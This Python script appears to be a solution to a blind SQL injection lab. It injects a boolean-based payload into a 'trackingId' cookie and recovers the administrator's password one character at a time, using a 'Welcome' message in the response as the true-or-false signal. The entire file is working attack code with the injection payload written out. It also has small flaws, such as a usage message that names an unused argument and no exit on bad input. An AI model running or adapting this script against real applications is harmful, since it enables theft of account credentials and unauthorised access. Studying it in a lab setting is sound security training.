import requests
import sys  
import urllib3
import urllib
from bs4 import BeautifulSoup
import re   
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}




def sqli_password(url):
    password_extracted =""
    for i in range(1, 21):  # assuming the password length is 20
        for j in range(32, 126):  # printable ASCII characters
            sqli_payload = "' and (select ascii(substring(password, %s,1)) from users where username ='administrator') ='%s'--" % (i,j)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookie = {'trackingId': 'qmzMr5t7QPb6LAwF'+sqli_payload_encoded, 'session': 'YXXj1t1ClIPA8V4kXHyOk7JxmoY1rVBX'}
            r =  requests.get(url, cookies=cookie, proxies=proxies, verify=False)
            if "Welcome" not in r.text:
                sys.stdout.write('\r[+] Extracting password: ' + password_extracted + chr(j))
                sys.stdout.flush()
            else:
                password_extracted += chr(j)
                sys.stdout.write('\r[+] Extracting password: ' + password_extracted)
                sys.stdout.flush()
                break


def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print("[-] Example: %s http://example.com '1=1'" % sys.argv[0])
        
    url = sys.argv[1].strip() #we take the URL from command line arguments
    print("[+] retrievin admin password...")
    sqli_password(url)


if __name__ == "__main__":
    main()
